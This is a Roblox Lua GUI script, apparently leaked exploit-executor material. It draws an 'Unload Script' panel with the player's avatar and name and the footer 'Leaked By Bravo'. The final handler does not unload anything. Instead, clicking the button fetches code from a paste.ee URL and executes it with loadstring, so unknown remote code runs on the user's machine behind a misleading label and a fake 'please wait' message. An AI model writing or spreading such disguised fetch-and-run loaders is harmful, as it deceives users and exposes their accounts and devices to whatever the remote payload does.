local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

-- Create GUI container
local gui = Instance.new("ScreenGui")
gui.Name = "UnloadScriptGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = playerGui

-- Create draggable frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 160)
frame.Position = UDim2.new(0.35, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.ZIndex = 1
frame.Parent = gui

-- Rounded corners for the frame
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Gradient effect
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50))
}
gradient.Rotation = 90
gradient.Parent = frame

-- Player Avatar
local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(0, 36, 0, 36)
avatar.Position = UDim2.new(0, 10, 0, 10)
avatar.BackgroundTransparency = 1
avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
avatar.ZIndex = 2
avatar.Parent = frame
Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

-- Player Name Label
local name = Instance.new("TextLabel")
name.Size = UDim2.new(0, 180, 0, 24)
name.Position = UDim2.new(0, 50, 0, 15)
name.BackgroundTransparency = 1
name.Text = player.Name
name.TextColor3 = Color3.new(1, 1, 1)
name.Font = Enum.Font.GothamMedium
name.TextSize = 16
name.TextXAlignment = Enum.TextXAlignment.Left
name.ZIndex = 2
name.Parent = frame

-- Description
local description = Instance.new("TextLabel")
description.Size = UDim2.new(1, -20, 0, 40)
description.Position = UDim2.new(0, 10, 0, 50)
description.BackgroundTransparency = 1
description.Text = "Unloading might take a minute or a while please wait."
description.TextColor3 = Color3.fromRGB(200, 200, 200)
description.Font = Enum.Font.Gotham
description.TextWrapped = true
description.TextSize = 14
description.TextXAlignment = Enum.TextXAlignment.Center
description.TextYAlignment = Enum.TextYAlignment.Top
description.ZIndex = 2
description.Parent = frame

-- Unload Script Button
local unloadBtn = Instance.new("TextButton")
unloadBtn.Size = UDim2.new(0, 200, 0, 40)
unloadBtn.Position = UDim2.new(0.5, -100, 1, -60)
unloadBtn.BackgroundColor3 = Color3.fromRGB(60, 100, 200)
unloadBtn.Text = "Unload Script"
unloadBtn.TextSize = 20
unloadBtn.TextColor3 = Color3.new(1, 1, 1)
unloadBtn.Font = Enum.Font.GothamBold
unloadBtn.ZIndex = 2
unloadBtn.Parent = frame
Instance.new("UICorner", unloadBtn).CornerRadius = UDim.new(0, 10)

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -30, 0, 6)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 14
closeBtn.Font = Enum.Font.GothamBold
closeBtn.ZIndex = 2
closeBtn.Parent = frame
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -10, 0, 18)
footer.Position = UDim2.new(0, 5, 1, -20)
footer.BackgroundTransparency = 1
footer.Text = "Leaked By Bravo"
footer.TextColor3 = Color3.fromRGB(160, 160, 160)
footer.Font = Enum.Font.Gotham
footer.TextSize = 13
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.ZIndex = 2
footer.Parent = frame

-- Close functionality
closeBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

-- Smooth hover effect
local originalColor = unloadBtn.BackgroundColor3
local hoverColor = Color3.fromRGB(80, 130, 230)

local function tweenColor(button, targetColor)
	local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tween = TweenService:Create(button, tweenInfo, { BackgroundColor3 = targetColor })
	tween:Play()
end

unloadBtn.MouseEnter:Connect(function()
	tweenColor(unloadBtn, hoverColor)
end)

unloadBtn.MouseLeave:Connect(function()
	tweenColor(unloadBtn, originalColor)
end)

-- Execute script when button clicked
unloadBtn.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://paste.ee/r/hHckBavN"))()
end)
